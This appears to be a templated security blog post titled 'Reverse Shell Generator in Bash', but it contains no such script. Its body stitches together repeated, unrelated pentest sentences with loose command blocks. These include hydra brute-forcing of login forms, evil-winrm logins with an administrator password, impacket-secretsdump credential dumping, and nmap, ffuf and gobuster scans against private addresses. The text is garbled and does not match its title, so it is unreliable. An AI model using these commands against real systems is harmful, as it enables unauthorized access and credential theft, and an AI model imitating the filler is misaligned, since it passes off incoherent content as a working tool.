---
TitleSEO: "Reverse Shell Generator in Bash | ZureFX"
TitlePost: "Reverse Shell Generator — Bash"
Author: "ZureFX"
Description: "A Bash script for reverse shell generator. Built for security research and automation."
Keywords: "scanner, script, python, automation, rust, bash"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-532.html"
URL_IMAGES: ""
Date: "2025-06-20"
Tags: "Scanner, Script, Python, Automation, Rust, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-532"
Permalink: "/scripting/script-reverse-shell-generator-532.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `ffuf`
- `ffuf`
- `dcomexec`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p3306,143,443 10.94.230.82 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.38.88/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.104.94.76 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.40.170.146 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.19.94.71 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.92.122 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
gobuster dir -u http://10.73.10.13/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.213.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.232.83
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.82.61 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.193.190 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 11 results
[+] Done in 4.52s
```
